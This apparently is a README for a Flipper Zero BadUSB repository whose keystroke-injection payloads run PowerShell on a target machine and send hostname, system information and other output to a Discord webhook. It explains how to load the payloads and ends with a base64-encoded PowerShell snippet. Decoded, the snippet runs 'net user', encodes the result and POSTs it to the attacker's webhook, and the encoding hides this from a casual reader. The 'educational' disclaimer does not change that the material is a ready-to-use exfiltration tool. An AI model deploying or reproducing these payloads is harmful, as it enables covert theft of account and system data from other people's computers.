# Flipper-Zero-BadUSB

Flipper Zero BadUSB payloads for relaying data to a Discord webhook.

## About

This repository contains a collection of payloads for the Flipper Zero, USB Rubber Ducky or similar devices. 

The idea of run the PowerShell payload in base64 was inspired by the project from [InfoSecREDD](https://github.com/InfoSecREDD/REPG).

## Disclaimer

All these payloads are designed for educational, testing, and research purposes in cybersecurity.

I am not a professional in PowerShell scripting. I am using this project to learn about DuckyScripting and its capabilities with Flipper Zero. 

Feel free to fork and contribute to the community.

## Usage

To load these payloads onto your Flipper Zero, you should copy them into the SDcard's "`badusb`" folder.

The provided script `Hostname2Disc.txt` will send the response in plain text because it's not too long (hostname).

However, in the example `SysInfo2Disc.txt` we see how the response will be sent in base64-encoded and in multiple messages as it exceeds the character limit of the POST method message.

Here are some things to consider:
* The `REM` command does not perform any keystroke injection, is just a comment.
* In each payload, remember to replace "`webhookgoeshere`" with your webhook URL for the variable `$webhook`.
* The base64-encoded code generated from the `echo` command contains the compiled PowerShell script. This can also be replaced with other PowerShell commands.

### Example

Below is an example of a PowerShell script encoded in base64 that executes the `net user` command:

Base64 code:
``JG91dHB1dCA9IG5ldCB1c2VyCiRiYXNlNjRPdXRwdXQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJG91dHB1dCkpCiRib2R5ID0gQHsKICAgIGNvbnRlbnQgPSAkYmFzZTY0T3V0cHV0Cn0gfCBDb252ZXJ0VG8tSnNvbgpJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR3ZWJob29rIC1NZXRob2QgUG9zdCAtQm9keSAkYm9keSAtQ29udGVudFR5cGUgImFwcGxpY2F0aW9uL2pzb24iCg==``
